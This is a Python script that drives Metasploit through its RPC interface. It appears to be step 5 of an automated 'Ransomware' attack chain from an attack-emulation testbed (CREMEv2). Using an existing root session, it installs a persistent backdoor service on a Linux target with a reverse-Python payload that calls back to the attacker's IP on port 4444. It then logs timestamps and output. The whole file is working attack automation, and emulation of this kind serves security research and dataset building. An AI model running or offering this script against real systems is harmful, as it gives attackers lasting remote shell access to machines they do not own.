import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient

def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())

def main(argv):
    # --- Argument Handling ---
    # Argv: 0=script, 1=folder, 2=my_ip, 3=target_ip, 4=session_id
    if len(argv) < 5:
        print("[ERROR] Missing Session ID argument.")
        print("Usage: python3 05_step_Ransomware.py <folder> <my_ip> <target_ip> <ROOT_SESSION_ID>")
        # Fallback for testing if needed, but risky for automation
        print("[WARNING] Defaulting to Session 2 (Standard for CREMEv2)")
        session_to_use = '2'
    else:
        session_to_use = argv[4]

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    
    print(f"--- [Step 5] Persistence Installation ---")
    print(f"Target: {target_ip} | Attacker: {my_ip} | Using Root Session: {session_to_use}")

    # Record Start Time
    output_time_file_start = 'time_step_5_start.txt'
    record_timestamp(folder, output_time_file_start)
    
    # Sleep as per original script requirements
    print("Waiting 60s (Script Requirement)...")
    time.sleep(60)

    client = MsfRpcClient('kali')
    
    # 1. Create Console
    try:
        cid = client.consoles.console().cid
        console = client.consoles.console(cid)
        print(f"Console {cid} created.")
        
        # 2. Verify Session Exists
        active_sessions = client.sessions.list
        if session_to_use not in active_sessions:
            print(f"[ERROR] Session {session_to_use} is not active. Persistence cannot be installed.")
            return

        # 3. Prepare Commands
        # We use the 'service_persistence' module to install a backdoor service
        commands = [
            'use exploit/linux/local/service_persistence',
            f'set SESSION {session_to_use}',
            'set PAYLOAD cmd/unix/reverse_python',
            f'set LHOST {my_ip}',
            'set LPORT 4444', # Default port, ensure it doesn't conflict if previous sessions are open
            'set VERBOSE true',
            'run'
        ]

        # 4. Execute Commands
        for cmd in commands:
            console.write(cmd)
            time.sleep(0.5)

        # 5. Stream Output (Polling Loop)
        print("--- Metasploit Persistence Output ---")
        max_wait_time = 120
        start_time = time.time()
        
        while True:
            result = console.read()
            data = result.get('data', '')
            
            if data:
                print(data, end='') # Print to stdout for the Controller to catch
                
                # Check for success indicators
                if "Service" in data and "installed" in data:
                    print("\n[+] Persistence Service Installed Successfully.")
                
                # Check for completion
                if "Module execution completed" in data or "Post module execution completed" in data:
                    break
            
            if time.time() - start_time > max_wait_time:
                print("\n[!] Timeout waiting for persistence module.")
                break
            
            time.sleep(1)

        # 6. Cleanup (Optional Logic from Original Script)
        # The original script stopped sessions 2 and 3 here.
        # In a continuous attack, you might want to keep them, 
        # but to replicate the original logic (simulating the attacker leaving and coming back):
        print("\n[Info] Original script logic: Stopping sessions to simulate disconnection...")
        try:
            # Attempt to close the session used for installation
            # client.sessions.session(session_to_use).stop()
            # print(f"Session {session_to_use} stopped.")
            pass # Commented out for safety in testing; uncomment if you strictly want original behavior
        except:
            pass

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if 'console' in locals():
            print(f"Destroying console {cid}...")
            console.destroy()

    time.sleep(30)
    output_time_file_end = 'time_step_5_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(30)

if __name__ == "__main__":
    main(sys.argv)